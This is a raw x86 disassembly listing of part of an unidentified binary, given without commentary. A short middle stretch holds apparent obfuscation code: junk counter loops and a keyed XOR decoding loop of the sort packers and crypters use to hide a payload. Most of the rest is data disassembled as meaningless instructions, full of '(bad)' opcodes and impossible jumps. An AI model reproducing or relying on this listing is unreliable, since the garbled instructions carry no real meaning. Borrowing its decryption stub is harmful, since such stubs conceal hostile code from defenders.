  40a665:	repnz sub DWORD PTR [eax+0x2c82b068],ecx
  40a66c:	sub    al,BYTE PTR [ebp+0x673733bc]
  40a672:	pop    ebx
  40a673:	out    dx,al
  40a674:	jl     0x40a65b
  40a676:	sub    ecx,edx
  40a678:	fisub  DWORD PTR [edi+0x24]
  40a67b:	mov    ecx,0xda60ed42
  40a680:	js     0x40a6c2
  40a682:	mov    esp,edi
  40a684:	iret   
  40a685:	inc    ebp
  40a686:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a688:	ja     0x40a60a
  40a68a:	xor    al,0x74
  40a68c:	add    eax,DWORD PTR [eax+0x75]
  40a68f:	lock popa 
  40a691:	push   eax
  40a692:	daa    
  40a693:	sahf   
  40a694:	mov    al,0xf5
  40a696:	fidivr WORD PTR [edx+ebp*8+0x556f8d6c]
  40a69d:	ins    DWORD PTR es:[edi],dx
  40a69e:	inc    eax
  40a69f:	inc    esi
  40a6a0:	and    DWORD PTR [ebp+eax*2+0x30e5d5c7],0x7f
  40a6a8:	aam    0x42
  40a6aa:	fadd   DWORD PTR [eax+ebp*8-0x3f]
  40a6ae:	sbb    ah,BYTE PTR [esi]
  40a6b0:	loop   0x40a725
  40a6b2:	pusha  
  40a6b3:	fwait
  40a6b4:	(bad)  
  40a6b5:	test   eax,0x762cc500
  40a6ba:	and    dl,dl
  40a6bc:	cli    
  40a6bd:	sub    DWORD PTR [esi+0x2fd873ef],ecx
  40a6c3:	add    al,0x4c
  40a6c5:	adc    DWORD PTR [eax-0x4b3b1580],0xffffffd2
  40a6cc:	adc    BYTE PTR ds:0x6413cd14,0xb7
  40a6d3:	(bad)  
  40a6d5:	loope  0x40a679
  40a6d7:	ret    0xaf57
  40a6da:	leave  
  40a6db:	pop    es
  40a6dc:	inc    ecx
  40a6dd:	test   ecx,0x45896a35
  40a6e3:	or     bh,al
  40a6e5:	add    eax,0x42861f
  40a6ea:	sbb    al,BYTE PTR [eax]
  40a6ec:	add    BYTE PTR [eax],al
  40a6ee:	cmp    DWORD PTR ds:0x42861f,0x0
  40a6f5:	je     0x40a72f
  40a6fb:	cmp    DWORD PTR ds:0x42861f,0x24
  40a702:	jbe    0x40a72f
  40a708:	jmp    0x40a71d
  40a70d:	push   0x42862f
  40a712:	push   0x428042
  40a717:	call   DWORD PTR ds:0x4287cb
  40a71d:	mov    edx,DWORD PTR ds:0x42861f
  40a723:	dec    edx
  40a724:	mov    DWORD PTR ds:0x42861f,edx
  40a72a:	jmp    0x40a6ee
  40a72f:	mov    eax,DWORD PTR [ebp-0x24]
  40a732:	and    DWORD PTR ds:0x42866f,0x0
  40a73c:	jmp    0x40a74e
  40a741:	mov    edx,DWORD PTR ds:0x42866f
  40a747:	inc    edx
  40a748:	mov    DWORD PTR ds:0x42866f,edx
  40a74e:	cmp    DWORD PTR ds:0x42866f,0x17
  40a755:	jae    0x40a78b
  40a75b:	cmp    DWORD PTR ds:0x42866f,0x1b
  40a762:	jl     0x40a78b
  40a768:	jmp    0x40a786
  40a76d:	push   DWORD PTR [ebp-0x28]
  40a770:	push   DWORD PTR [ebp-0x18]
  40a773:	push   0x56d8
  40a778:	push   0x2d04
  40a77d:	push   DWORD PTR [ebp-0x10]
  40a780:	call   DWORD PTR ds:0x42879f
  40a786:	jmp    0x40a741
  40a78b:	mov    edx,DWORD PTR [ebp+0x8]
  40a78e:	xor    eax,ecx
  40a790:	add    eax,esi
  40a792:	cmp    edx,eax
  40a794:	mov    DWORD PTR ds:0x42860b,0x4a21
  40a79e:	jbe    0x40a816
  40a7a4:	mov    eax,DWORD PTR [ebp-0x24]
  40a7a7:	mov    DWORD PTR ds:0x428617,0x16
  40a7b1:	cmp    DWORD PTR ds:0x428617,0x0
  40a7b8:	je     0x40a809
  40a7be:	cmp    DWORD PTR ds:0x428617,0x4
  40a7c5:	ja     0x40a809
  40a7cb:	jmp    0x40a7db
  40a7d0:	push   0x5454
  40a7d5:	call   DWORD PTR ds:0x4287a3
  40a7db:	cmp    DWORD PTR ds:0x428617,0x5
  40a7e2:	jne    0x40a7f7
  40a7e8:	xor    edx,edx
  40a7ea:	add    edx,DWORD PTR ds:0x428617
  40a7f0:	dec    edx
  40a7f1:	mov    DWORD PTR ds:0x428617,edx
  40a7f7:	mov    edx,DWORD PTR ds:0x428617
  40a7fd:	dec    edx
  40a7fe:	mov    DWORD PTR ds:0x428617,edx
  40a804:	jmp    0x40a7b1
  40a809:	xor    eax,ecx
  40a80b:	add    eax,esi
  40a80d:	adc    edx,0x5d89
  40a813:	mov    DWORD PTR [ebp+0x8],eax
  40a816:	sub    edx,DWORD PTR ds:0x42867b
  40a81c:	mov    eax,DWORD PTR [ebp-0x28]
  40a81f:	mov    edx,DWORD PTR [ebp+0x8]
  40a822:	xor    eax,ecx
  40a824:	mov    DWORD PTR ds:0x428677,0x29fb
  40a82e:	add    eax,esi
  40a830:	sub    DWORD PTR ds:0x42865f,0x428667
  40a83a:	imul   eax,edx
  40a83d:	and    DWORD PTR ds:0x42866b,0x0
  40a847:	xor    edx,edx
  40a849:	xor    edx,DWORD PTR ds:0x42866b
  40a84f:	inc    edx
  40a850:	mov    DWORD PTR ds:0x42866b,edx
  40a856:	cmp    DWORD PTR ds:0x42866b,0x4
  40a85d:	jge    0x40a89f
  40a863:	jmp    0x40a876
  40a868:	push   DWORD PTR [ebp-0x1c]
  40a86b:	push   0x428034
  40a870:	call   DWORD PTR ds:0x4287a7
  40a876:	cmp    DWORD PTR ds:0x42866b,0x3
  40a87d:	jne    0x40a892
  40a883:	xor    edx,edx
  40a885:	xor    edx,DWORD PTR ds:0x42866b
  40a88b:	inc    edx
  40a88c:	mov    DWORD PTR ds:0x42866b,edx
  40a892:	cmp    DWORD PTR ds:0x42866b,0x10
  40a899:	jb     0x40a847
  40a89f:	mov    DWORD PTR [ebp+0x8],eax
  40a8a2:	mov    edx,DWORD PTR ds:0x428693
  40a8a8:	mov    edx,DWORD PTR [edx]
  40a8aa:	sbb    DWORD PTR ds:0x42861f,edx
  40a8b0:	mov    eax,DWORD PTR [ebp-0x14]
  40a8b3:	mov    edx,DWORD PTR [ebp+0x8]
  40a8b6:	xor    eax,ecx
  40a8b8:	add    eax,esi
  40a8ba:	cmp    edx,eax
  40a8bc:	je     0x40aa1e
  40a8c2:	mov    eax,DWORD PTR [ebp+0x8]
  40a8c5:	mov    DWORD PTR [ebp-0x20],eax
  40a8c8:	mov    eax,DWORD PTR [ebp-0x4]
  40a8cb:	add    eax,DWORD PTR [ebp-0x30]
  40a8ce:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  40a8d5:	mov    DWORD PTR [ebp-0x1c],edi
  40a8d8:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  40a8df:	mov    DWORD PTR [ebp-0x10],eax
  40a8e2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40a8e9:	mov    DWORD PTR [ebp-0xc],edi
  40a8ec:	mov    eax,DWORD PTR [ebp-0x2c]
  40a8ef:	xor    eax,ecx
  40a8f1:	add    eax,esi
  40a8f3:	jmp    0x40a9da
  40a8f8:	mov    DWORD PTR [ebp-0x38],0xf89c85bb
  40a8ff:	mov    DWORD PTR [ebp-0x3c],0xf89c858e
  40a906:	mov    eax,DWORD PTR [ebp-0xc]
  40a909:	mov    edx,DWORD PTR [ebp+0x8]
  40a90c:	xor    eax,ecx
  40a90e:	add    eax,esi
  40a910:	imul   eax,edx
  40a913:	mov    edx,DWORD PTR [ebp-0x10]
  40a916:	mov    al,BYTE PTR [eax+edx*1]
  40a919:	mov    BYTE PTR [ebp+0xf],al
  40a91c:	mov    eax,DWORD PTR [ebp-0xc]
  40a91f:	mov    edx,DWORD PTR [ebp+0x8]
  40a922:	xor    eax,ecx
  40a924:	add    eax,esi
  40a926:	imul   eax,edx
  40a929:	mov    edx,DWORD PTR [ebp-0x34]
  40a92c:	xor    edx,ecx
  40a92e:	add    eax,edx
  40a930:	mov    edx,DWORD PTR [ebp-0x10]
  40a933:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a93b:	mov    edx,DWORD PTR [ebp-0x38]
  40a93e:	xor    edx,ecx
  40a940:	lea    eax,[edx+eax*1+0x3272ec]
  40a947:	movzx  edx,BYTE PTR [ebp+0xf]
  40a94b:	xor    edx,eax
  40a94d:	mov    BYTE PTR [ebp+0xf],dl
  40a950:	mov    al,BYTE PTR [ebp+0xf]
  40a953:	mov    edx,DWORD PTR [ebp-0xc]
  40a956:	mov    ebx,DWORD PTR [ebp+0x8]
  40a959:	xor    edx,ecx
  40a95b:	add    edx,esi
  40a95d:	imul   edx,ebx
  40a960:	mov    ebx,DWORD PTR [ebp-0x10]
  40a963:	mov    BYTE PTR [edx+ebx*1],al
  40a966:	mov    eax,DWORD PTR [ebp-0xc]
  40a969:	mov    edx,DWORD PTR [ebp+0x8]
  40a96c:	xor    eax,ecx
  40a96e:	add    eax,esi
  40a970:	imul   eax,edx
  40a973:	mov    edx,DWORD PTR [ebp-0x10]
  40a976:	mov    al,BYTE PTR [eax+edx*1]
  40a979:	mov    BYTE PTR [ebp+0xf],al
  40a97c:	mov    eax,DWORD PTR [ebp-0xc]
  40a97f:	mov    edx,DWORD PTR [ebp+0x8]
  40a982:	xor    eax,ecx
  40a984:	add    eax,esi
  40a986:	imul   eax,edx
  40a989:	mov    edx,DWORD PTR [ebp-0x1c]
  40a98c:	xor    edx,ecx
  40a98e:	add    eax,edx
  40a990:	mov    edx,DWORD PTR [ebp-0x10]
  40a993:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a99b:	mov    edx,DWORD PTR [ebp-0x3c]
  40a99e:	xor    edx,ecx
  40a9a0:	lea    eax,[edx+eax*1+0x3272ec]
  40a9a7:	movzx  edx,BYTE PTR [ebp+0xf]
  40a9ab:	xor    edx,eax
  40a9ad:	mov    BYTE PTR [ebp+0xf],dl
  40a9b0:	mov    al,BYTE PTR [ebp+0xf]
  40a9b3:	mov    edx,DWORD PTR [ebp-0xc]
  40a9b6:	mov    ebx,DWORD PTR [ebp+0x8]
  40a9b9:	xor    edx,ecx
  40a9bb:	add    edx,esi
  40a9bd:	imul   edx,ebx
  40a9c0:	mov    ebx,DWORD PTR [ebp-0x10]
  40a9c3:	mov    BYTE PTR [edx+ebx*1],al
  40a9c6:	mov    eax,DWORD PTR [ebp-0x40]
  40a9c9:	mov    edx,DWORD PTR [ebp-0x1c]
  40a9cc:	xor    eax,ecx
  40a9ce:	xor    edx,ecx
  40a9d0:	add    eax,esi
  40a9d2:	add    edx,esi
  40a9d4:	imul   eax,edx
  40a9d7:	add    eax,DWORD PTR [ebp+0x8]
  40a9da:	mov    DWORD PTR [ebp+0x8],eax
  40a9dd:	mov    eax,DWORD PTR [ebp+0x8]
  40a9e0:	mov    edx,DWORD PTR [ebp-0x20]
  40a9e3:	cmp    edx,eax
  40a9e5:	jb     0x40a8f8
  40a9eb:	mov    eax,DWORD PTR [ebp-0x1c]
  40a9ee:	mov    edx,DWORD PTR [ebp-0x20]
  40a9f1:	xor    eax,ecx
  40a9f3:	add    eax,esi
  40a9f5:	imul   eax,edx
  40a9f8:	mov    edx,DWORD PTR [ebp-0x2c]
  40a9fb:	xor    edx,ecx
  40a9fd:	add    edx,esi
  40a9ff:	or     eax,edx
  40aa01:	mov    edx,DWORD PTR [ebp-0x8]
  40aa04:	xor    edx,ecx
  40aa06:	add    eax,edx
  40aa08:	mov    edx,DWORD PTR [ebp-0x8]
  40aa0b:	xor    edx,ecx
  40aa0d:	add    eax,edx
  40aa0f:	mov    edx,DWORD PTR [ebp-0x4]
  40aa12:	lea    eax,[eax+edx*1+0x64e5d8]
  40aa19:	jmp    0x40aa2d
  40aa1e:	mov    eax,DWORD PTR [ebp-0x8]
  40aa21:	mov    edx,DWORD PTR [ebp-0x4]
  40aa24:	xor    eax,ecx
  40aa26:	lea    eax,[eax+edx*1+0x3272ec]
  40aa2d:	mov    DWORD PTR [ebp-0x4],eax
  40aa30:	mov    eax,DWORD PTR [ebp-0x8]
  40aa33:	xor    eax,ecx
  40aa35:	mov    edx,0xffcd8d14
  40aa3a:	sub    edx,eax
  40aa3c:	add    edx,DWORD PTR [ebp-0x18]
  40aa3f:	mov    eax,DWORD PTR [ebp-0x8]
  40aa42:	mov    ebx,DWORD PTR [ebp-0x4]
  40aa45:	xor    eax,ecx
  40aa47:	add    eax,esi
  40aa49:	imul   eax,ebx
  40aa4c:	cmp    eax,edx
  40aa4e:	jbe    0x4082fa
  40aa54:	pop    ebx
  40aa55:	pop    edi
  40aa56:	pop    esi
  40aa57:	leave  
  40aa58:	ret    0x8
  40aa5b:	push   ebp
  40aa5c:	mov    ebp,esp
  40aa5e:	sub    esp,0x10
  40aa61:	mov    eax,ds:0x4286a3
  40aa66:	mov    ecx,DWORD PTR ds:0x428727
  40aa6c:	sub    ecx,eax
  40aa6e:	add    eax,DWORD PTR [eax+ecx*1]
  40aa71:	mov    eax,0xf89c85b0
  40aa76:	mov    DWORD PTR [ebp-0x4],eax
  40aa79:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40aa80:	mov    edx,DWORD PTR ds:0x4286db
  40aa86:	xor    ecx,ecx
  40aa88:	or     ecx,DWORD PTR ds:0x428717
  40aa8e:	sub    ecx,edx
  40aa90:	xor    edx,DWORD PTR [edx+ecx*1]
  40aa93:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa96:	or     edx,0x191e
  40aa9c:	push   esi
  40aa9d:	and    DWORD PTR ds:0x4285db,0x0
  40aaa7:	mov    edx,DWORD PTR ds:0x4285db
  40aaad:	inc    edx
  40aaae:	mov    DWORD PTR ds:0x4285db,edx
  40aab4:	cmp    DWORD PTR ds:0x4285db,0x1e
  40aabb:	jl     0x40aae5
  40aac1:	jmp    0x40aad8
  40aac6:	push   0x428028
  40aacb:	push   0x1
  40aacd:	push   0x77f2
  40aad2:	call   DWORD PTR ds:0x4287ab
  40aad8:	cmp    DWORD PTR ds:0x4285db,0x13
  40aadf:	jb     0x40aaa7
  40aae5:	mov    edx,0x75108a4
  40aaea:	sbb    esi,0x397d
  40aaf0:	xor    ecx,edx
  40aaf2:	and    DWORD PTR ds:0x42866f,0x0
  40aafc:	xor    esi,esi
  40aafe:	add    esi,DWORD PTR ds:0x42866f
  40ab04:	inc    esi
  40ab05:	mov    DWORD PTR ds:0x42866f,esi
  40ab0b:	cmp    DWORD PTR ds:0x42866f,0x21
  40ab12:	jge    0x40ceb9
  40ab18:	jmp    0x40ab28
  40ab1d:	push   0x42801b
  40ab22:	call   DWORD PTR ds:0x4287af
  40ab28:	cmp    DWORD PTR ds:0x42866f,0x1c
  40ab2f:	jb     0x40aafc
  40ab35:	jmp    0x40ceb9
  40ab3a:	jo     0x40aaf5
  40ab3c:	aam    0x1d
  40ab3e:	mov    DWORD PTR [ebx],0xd07b7bab
  40ab44:	xor    DWORD PTR [ecx],edx
  40ab46:	jp     0x40ab89
  40ab48:	mov    eax,ds:0x7ae8142d
  40ab4d:	jp     0x40ab62
  40ab4f:	pop    edi
  40ab50:	jp     0x40abcc
  40ab52:	mov    esp,0x331ddd97
  40ab57:	enter  0x2e04,0x9e
  40ab5b:	pop    edx
  40ab5c:	mov    edx,0xa201652
  40ab61:	dec    edx
  40ab62:	sahf   
  40ab63:	je     0x40abdc
  40ab65:	xor    dh,ch
  40ab67:	push   es
  40ab68:	xor    al,0x72
  40ab6a:	jl     0x40ab51
  40ab6c:	loopne 0x40ab58
  40ab6e:	xchg   esi,eax
  40ab6f:	sbb    bh,BYTE PTR [esi]
  40ab71:	repnz mov cl,0x81
  40ab74:	push   ebp
  40ab75:	lods   al,BYTE PTR ds:[esi]
  40ab76:	jecxz  0x40ab58
  40ab78:	mov    al,0x5b
  40ab7a:	dec    ecx
  40ab7b:	add    ecx,edi
  40ab7d:	jb     0x40ab8f
  40ab7f:	xor    ch,BYTE PTR [ebx]
  40ab81:	icebp  
  40ab82:	mov    eax,ds:0x76431a5e
  40ab87:	test   al,0x7
  40ab89:	inc    esi
  40ab8a:	push   es
  40ab8b:	push   edi
  40ab8c:	sti    
  40ab8d:	sbb    edx,ebx
  40ab8f:	outs   dx,DWORD PTR ds:[esi]
  40ab90:	dec    edi
  40ab91:	xchg   ecx,eax
  40ab92:	fiadd  DWORD PTR es:[ebp-0x76]
  40ab96:	sbb    eax,0x6d7409dd
  40ab9b:	cmp    BYTE PTR [esi],al
  40ab9d:	pusha  
  40ab9e:	lahf   
  40ab9f:	lahf   
  40aba0:	xchg   edx,eax
  40aba1:	lahf   
  40aba2:	scas   eax,DWORD PTR es:[edi]
  40aba3:	push   edi
  40aba4:	shl    BYTE PTR [ecx+edi*8],0xfd
  40aba8:	daa    
  40aba9:	push   edi
  40abaa:	aam    0x55
  40abac:	adc    ecx,eax
  40abae:	mov    ebx,0x1adc0c56
  40abb3:	imul   esp,DWORD PTR [ecx+0x4b],0x72
  40abb7:	cmp    ch,dl
  40abb9:	cmp    bh,BYTE PTR [ebx]
  40abbb:	arpl   WORD PTR ds:0x347bdd8a,ax
  40abc1:	int3   
  40abc2:	enter  0xfc64,0x3d
  40abc6:	mov    eax,ds:0x7b8dcf7b
  40abcb:	imul   ebp,DWORD PTR [eax-0x5e83de6b],0xffffffd0
  40abd2:	mov    edi,0x4c0320f2
  40abd7:	test   al,0x64
  40abd9:	xor    edi,DWORD PTR [edx+ebp*8+0x12]
  40abdd:	retf   0x1adf
  40abe0:	stc    
  40abe1:	sbb    esp,DWORD PTR [ebx-0x18]
  40abe4:	mov    eax,DWORD PTR [ebp+0x25948164]
  40abea:	(bad)  [ecx+ebp*1+0x20]
  40abee:	mov    esp,0x4d5f9674
  40abf3:	adc    eax,0xaf1013bb
  40abf8:	push   esi
  40abf9:	fnstcw WORD PTR [eax-0x54]
  40abfc:	int3   
  40abfd:	icebp  
  40abfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abff:	ret    
  40ac00:	cmp    ebx,esi
  40ac02:	dec    esi
  40ac03:	cmp    al,0xc6
  40ac05:	push   0x4f
  40ac07:	mov    cl,0x79
  40ac09:	pop    edx
  40ac0a:	inc    edi
  40ac0b:	push   0x382dfbfd
  40ac10:	in     eax,dx
  40ac11:	shl    esi,1
  40ac13:	add    WORD PTR [ecx],cx
  40ac16:	retf   
  40ac17:	call   0x8763b06f
  40ac1c:	in     eax,dx
  40ac1d:	fcom   DWORD PTR [edx+0x48caabdf]
  40ac23:	retf   0xe97d
  40ac26:	xchg   sp,ax
  40ac28:	cdq    
  40ac29:	inc    ecx
  40ac2a:	mov    ds:0x7caf844e,eax
  40ac2f:	and    eax,0x8742d6cf
  40ac34:	xchg   BYTE PTR [ebp-0x55f30ebc],bh
  40ac3a:	call   0xb53d916c
  40ac3f:	adc    DWORD PTR [esp+ebx*8-0x69693bee],0x62
  40ac47:	arpl   WORD PTR [edi-0x28],si
  40ac4a:	dec    BYTE PTR [edi]
  40ac4c:	aam    0xf7
  40ac4e:	xor    al,0xb
  40ac50:	jnp    0x40ac40
  40ac52:	mov    ds:0xedc99f16,eax
  40ac57:	dec    ebp
  40ac58:	repz adc al,0x7b
  40ac5b:	mov    eax,ds:0x87a079d2
  40ac60:	jns    0x40ac2d
  40ac62:	push   ecx
  40ac63:	ret    0x8372
  40ac66:	add    al,0x12
  40ac68:	pop    es
  40ac69:	lods   eax,DWORD PTR ds:[esi]
  40ac6a:	xchg   ebx,eax
  40ac6b:	adc    DWORD PTR [esi-0x454ec9dc],esi
  40ac71:	push   esi
  40ac72:	push   cs
  40ac73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac74:	cmc    
  40ac75:	add    DWORD PTR [ebp-0x3caa423b],esp
  40ac7b:	mov    edi,0xb791cae3
  40ac80:	mov    esp,0xeb86fa33
  40ac85:	xchg   ebx,eax
  40ac86:	inc    ebp
  40ac87:	loop   0x40aced
  40ac89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac8a:	push   eax
  40ac8b:	adc    al,0x78
  40ac8d:	sub    dh,dh
  40ac8f:	jbe    0x40ad0b
  40ac91:	mov    eax,0xed18000e
  40ac96:	inc    ecx
  40ac97:	inc    esi
  40ac98:	lds    ebp,FWORD PTR [ebx+0x5c]
  40ac9b:	mov    bh,0xfa
  40ac9d:	(bad)  
  40ac9e:	xor    cl,dh
  40aca0:	mov    dl,0xae
  40aca2:	pop    esp
  40aca3:	xchg   edi,eax
  40aca4:	test   eax,0x7bf4128
  40aca9:	fmul   st,st(5)
  40acab:	cld    
  40acac:	mov    esp,0x81919cfd
  40acb1:	loopne 0x40acec
  40acb3:	push   cs
  40acb4:	mov    DWORD PTR [ecx+eiz*4+0x70720b94],eax
  40acbb:	scas   eax,DWORD PTR es:[edi]
  40acbc:	(bad)  
  40acbd:	retf   0x3cf2
  40acc0:	and    BYTE PTR [ebp-0x1c174654],bl
  40acc6:	mov    esi,0x66afd3f2
  40accb:	ror    DWORD PTR [ecx-0x43528f4c],1
  40acd1:	outs   dx,DWORD PTR ds:[esi]
  40acd2:	push   ss
  40acd3:	mov    esi,0x839df8ae
  40acd8:	jecxz  0x40ace0
  40acda:	mov    DWORD PTR [esi+0x5b],edi
  40acdd:	jb     0x40acef
  40acdf:	mov    esi,DWORD PTR ds:0xdf704b08
  40ace5:	icebp  
  40ace6:	sti    
  40ace7:	inc    ecx
  40ace8:	push   ecx
  40ace9:	sti    
  40acea:	(bad)  
  40aceb:	aas    
  40acec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aced:	addr16 mov al,ds:0xe3f7
  40acf1:	push   ss
  40acf2:	cmp    al,0x99
  40acf4:	add    al,0xb0
  40acf6:	jge    0x40ad59
  40acf8:	add    edx,ebp
  40acfa:	loop   0x40ad44
  40acfc:	add    BYTE PTR [eax],ah
  40acfe:	mov    dl,0x77
  40ad00:	and    eax,0xb4d0b3f8
  40ad05:	es push 0x7f30fadf
  40ad0b:	mov    ds:0x78488be2,al
  40ad10:	daa    
  40ad11:	leave  
  40ad12:	ret    
  40ad13:	(bad)
  40ad16:	clc    
  40ad17:	ds pusha 
  40ad19:	mov    al,0x8d
  40ad1b:	test   BYTE PTR [eax+0x2e],ch
  40ad1e:	jg     0x40acc5
  40ad20:	pusha  
  40ad21:	rol    DWORD PTR [ebx-0x43],0xd4
  40ad25:	dec    esp
  40ad26:	mov    ebx,0x81c432f4
  40ad2b:	dec    edx
  40ad2c:	popf   
  40ad2d:	stc    
  40ad2e:	or     al,0x94
  40ad30:	mov    gs,WORD PTR [esi-0x12]
  40ad33:	retf   
  40ad34:	xor    BYTE PTR [esi+0x538de5de],ah
  40ad3a:	(bad)  
  40ad3b:	cmp    eax,DWORD PTR ds:0x29ea7577
  40ad41:	imul   ecx,DWORD PTR [edx+0x5b],0xffffffb1
  40ad45:	xchg   edi,ebp
  40ad47:	sti    
  40ad48:	mov    ds:0x561a7178,al
  40ad4d:	mov    eax,ds:0x5b1b37bb
  40ad52:	stos   BYTE PTR es:[edi],al
  40ad53:	scas   al,BYTE PTR es:[edi]
  40ad54:	dec    esp
  40ad55:	rcr    bh,0x94
  40ad58:	xchg   esi,eax
  40ad59:	xor    cl,BYTE PTR [ecx-0x66a7fc7e]
  40ad5f:	push   ebp
  40ad60:	xchg   edx,eax
  40ad61:	jge    0x40ad32
  40ad63:	cmp    BYTE PTR [edi-0x55d75127],0xa4
  40ad6a:	push   ebp
  40ad6b:	push   ebp
  40ad6c:	push   ebp
  40ad6d:	mov    cl,0x28
  40ad6f:	pop    esp
  40ad70:	popa   
  40ad71:	data16 in al,dx
  40ad73:	shl    BYTE PTR [ebx+0x8],1
  40ad76:	add    ebx,ecx
  40ad78:	mov    ah,0x6c
  40ad7a:	push   edx
  40ad7b:	popa   
  40ad7c:	sub    bh,BYTE PTR [esi]
  40ad7e:	les    ecx,FWORD PTR [ebp-0x1b8a23ad]
  40ad84:	or     dh,BYTE PTR [ecx+eax*2+0x6a8060f]
  40ad8b:	pop    es
  40ad8c:	push   esi
  40ad8d:	cli    
  40ad8e:	mov    ebx,0xc595453e
  40ad93:	lods   al,BYTE PTR ds:[esi]
  40ad94:	pop    esi
  40ad95:	mov    BYTE PTR [edi+0x32],al
  40ad98:	mov    ebx,DWORD PTR [ecx-0x4b]
  40ad9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9c:	sub    eax,0xa0213e31
  40ada1:	ds push ss
  40ada3:	cli    
  40ada4:	fs dec esp
  40ada6:	push   0x4c
  40ada8:	jne    0x40ae14
  40adaa:	sti    
  40adab:	adc    ax,0x1bf1
  40adaf:	fs aas 
  40adb1:	rcr    BYTE PTR [edx+0x563ca872],cl
  40adb7:	mov    ah,0x65
  40adb9:	or     eax,0xd4f9bc1f
  40adbe:	test   al,0xd1
  40adc0:	jne    0x40addc
  40adc2:	mov    DWORD PTR [esi-0x70d6399c],0x4e0c79c0
  40adcc:	xor    DWORD PTR [esi+edi*8+0x6749912c],ebx
  40add3:	mov    cs,WORD PTR [esi]
  40add5:	pop    eax
  40add6:	in     al,0x25
  40add8:	into   
  40add9:	pop    edx
  40adda:	xor    esi,DWORD PTR [ebx+0x3f3f981b]
  40ade0:	and    dl,BYTE PTR [esi]
  40ade2:	dec    esi
  40ade3:	jb     0x40ae2d
  40ade5:	call   0x5f22:0xadb11019
  40adec:	(bad)  
  40aded:	out    0x85,al
  40adef:	in     al,dx
  40adf0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40adf2:	push   edi
  40adf3:	lock stos DWORD PTR es:[edi],eax
  40adf5:	xor    bl,dl
  40adf7:	out    dx,eax
  40adf8:	cmp    DWORD PTR [edi-0x1196d3b0],ebx
  40adfe:	cli    
  40adff:	jne    0x40ae38
  40ae01:	retf   
  40ae02:	mov    ds:0xf3836765,al
  40ae07:	fcmovnbe st,st(3)
  40ae09:	stc    
  40ae0a:	pop    ebp
  40ae0b:	lds    esp,FWORD PTR [edi-0x20]
  40ae0e:	cwde   
  40ae0f:	mov    dh,0x53
  40ae11:	push   edx
  40ae12:	adc    DWORD PTR [edx+0x4439f669],edx
  40ae18:	inc    esi
  40ae19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae1a:	push   0xa180733f
  40ae1f:	(bad)  
  40ae20:	imul   esi,DWORD PTR [esp+edi*8],0x3
  40ae24:	pop    ds
  40ae25:	pop    ds
  40ae26:	iret   
  40ae27:	xchg   edx,eax
  40ae28:	aam    0x55
  40ae2a:	dec    eax
  40ae2b:	add    ebp,DWORD PTR [edx+0x3d]
  40ae2e:	add    DWORD PTR [eax-0x52a2c4cb],ebp
  40ae34:	sub    dl,al
  40ae36:	addr16 jmp 0x531f6b6e
  40ae3c:	cld    
  40ae3d:	xchg   ebx,eax
  40ae3e:	outs   dx,DWORD PTR ds:[esi]
  40ae3f:	ror    BYTE PTR [eax],cl
  40ae41:	jge    0x40adfc
  40ae43:	mov    eax,DWORD PTR [ecx]
  40ae45:	dec    ebx
  40ae46:	adc    eax,0xb811e816
  40ae4b:	bound  eax,QWORD PTR [edx-0x5e]
  40ae4e:	aam    0xcc
  40ae50:	xor    DWORD PTR [ecx+edi*2-0x32f55e],esp
  40ae57:	sbb    esi,eax
  40ae59:	jnp    0x40ade6
  40ae5b:	sar    bh,cl
  40ae5d:	xor    DWORD PTR [ecx+0x2],ebp
  40ae60:	fild   DWORD PTR [eax-0x76367250]
  40ae66:	int    0x6b
  40ae68:	daa    
  40ae69:	in     al,dx
  40ae6a:	loopne 0x40aedc
  40ae6c:	or     eax,0x2454bc21
  40ae71:	shl    BYTE PTR ds:0x593041f0,cl
  40ae77:	add    BYTE PTR [edx],bl
  40ae79:	loop   0x40ae42
  40ae7b:	std    
  40ae7c:	mov    ah,0x67
  40ae7e:	ins    DWORD PTR es:[edi],dx
  40ae7f:	push   ebp
  40ae80:	ret    
  40ae81:	inc    esi
  40ae82:	sub    BYTE PTR [ecx+0x70a51b7d],dh
  40ae88:	cmp    DWORD PTR [eax+edx*1-0x63],eax
  40ae8c:	outs   dx,DWORD PTR ds:[esi]
  40ae8d:	mov    ecx,0x733a2850
  40ae92:	adc    dl,BYTE PTR ds:0xc2b8755
  40ae98:	mov    esp,0x95e48bde
  40ae9d:	xchg   DWORD PTR ds:0xb86329f6,ebx
  40aea3:	pop    ss
  40aea4:	neg    DWORD PTR [edi-0x3871d702]
  40aeaa:	stc    
  40aeab:	and    ch,BYTE PTR [edx+0x6ad5cafa]
  40aeb1:	ins    DWORD PTR es:[edi],dx
  40aeb2:	(bad)
  40aeb6:	das    
  40aeb7:	out    0x8b,al
  40aeb9:	cwde   
  40aeba:	xor    BYTE PTR [esi],bl
  40aebc:	xrelease mov DWORD PTR [ecx-0x7fb208c],esp
  40aec3:	aaa    
  40aec4:	mov    bl,0xfb
  40aec6:	mov    dh,0x7f
  40aec8:	mov    edx,0x987d30d9
  40aecd:	or     al,0x3a
  40aecf:	out    dx,al
  40aed0:	push   esi
  40aed1:	push   esp
  40aed2:	(bad)  
  40aed3:	xor    al,BYTE PTR [edx]
  40aed5:	sub    dh,ch
  40aed7:	xchg   ecx,eax
  40aed8:	aam    0x99
  40aeda:	mov    WORD PTR [ebp-0x29],cs
  40aedd:	popf   
  40aede:	mov    ebp,0xd5e509cd
  40aee3:	jbe    0x40aef3
  40aee5:	sub    ebx,0xb65b1e08
  40aeeb:	mov    WORD PTR [esi],?
  40aeed:	loope  0x40af49
  40aeef:	imul   ebx,DWORD PTR [esi],0x708f32d7
  40aef5:	jmp    0x715b2ea1
  40aefa:	jle    0x40aea7
  40aefc:	lsl    ebp,WORD PTR [esi]
